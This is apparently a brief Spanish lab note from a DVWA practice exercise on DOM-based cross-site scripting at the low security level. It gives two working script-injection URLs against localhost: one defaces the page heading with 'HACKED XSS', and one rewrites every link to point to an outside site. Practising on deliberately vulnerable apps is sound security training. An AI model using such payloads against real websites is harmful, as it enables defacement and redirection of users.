### LOW
```
MODIFICAR HTML
http://localhost:8000/dvwa/vulnerabilities/xss_d/?default=<script>document.getElementsByTagName("h1")[0].innerHTML="HACKED XSS";</script>
URL MODIFICADO
http://localhost:8000/dvwa/vulnerabilities/xss_d/?default=<script> var links = document.getElementsByTagName("a");for  (i=0; i<links.length; i++){ links[i].href = "http://debiantano.github.io"; links[i].innerHTML = "Link Modificado";} </script>
```
